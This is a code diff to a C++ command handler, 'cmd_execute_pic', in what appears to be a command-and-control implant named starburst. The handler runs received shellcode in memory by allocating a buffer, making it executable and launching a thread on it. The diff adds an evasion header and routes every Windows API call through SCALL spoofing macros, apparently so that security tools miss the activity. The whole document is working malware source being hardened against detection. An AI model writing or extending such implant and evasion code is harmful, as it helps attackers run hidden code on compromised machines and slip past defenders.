@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_EXECUTE_PIC
 
@@ -26,7 +27,7 @@ auto declfn starburst::cmd_execute_pic(
 
     DBG_PRINT( inst, "cmd_execute_pic: %u bytes\n", pic_len );
 
-    LPVOID mem = inst.kernel32.VirtualAlloc(
+    LPVOID mem = (LPVOID)SCALL( inst, kernel32.VirtualAlloc,
         nullptr, pic_len,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
 
@@ -47,27 +48,27 @@ auto declfn starburst::cmd_execute_pic(
             expr::hash_string( "VirtualProtect" ) ) );
 
     if ( !pVirtualProtect ) {
-        inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
+        SCALL( inst, kernel32.VirtualFree, mem, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "VirtualProtect resolve failed" ) ) );
         return;
     }
 
-    pVirtualProtect( mem, pic_len, PAGE_EXECUTE_READ, &old_protect );
+    SCALL_PTR( inst, pVirtualProtect, mem, pic_len, PAGE_EXECUTE_READ, &old_protect );
 
-    HANDLE h_thread = inst.kernel32.CreateThread(
+    HANDLE h_thread = (HANDLE)SCALL( inst, kernel32.CreateThread,
         nullptr, 0,
         (LPTHREAD_START_ROUTINE) mem,
         nullptr, 0, nullptr );
 
     if ( !h_thread ) {
-        inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
+        SCALL( inst, kernel32.VirtualFree, mem, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "CreateThread failed" ) ) );
         return;
     }
 
-    inst.kernel32.CloseHandle( h_thread );
+    SCALL( inst, kernel32.CloseHandle, h_thread );
 
     char msg[64] = { 0 };
     str_copy( msg, symbol<char*>( const_cast<char*>( "executed " ) ) );
